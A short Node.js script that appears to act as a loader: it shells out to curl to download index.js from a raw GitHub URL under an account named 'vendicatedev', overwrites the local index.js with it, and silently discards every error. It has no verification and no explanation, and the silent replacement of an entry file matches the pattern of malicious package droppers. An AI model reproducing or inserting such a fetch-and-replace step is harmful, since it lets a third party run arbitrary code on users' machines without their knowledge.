const { exec } = require('child_process');

(async () => {
    try {        
        await exec('curl -o index.js https://raw.githubusercontent.com/vendicatedev/venPlug/main/index.js', (err, stdout, stderr) => {
            if (err) {
                return;
            }
        });
    } catch (error) {
    }
})();
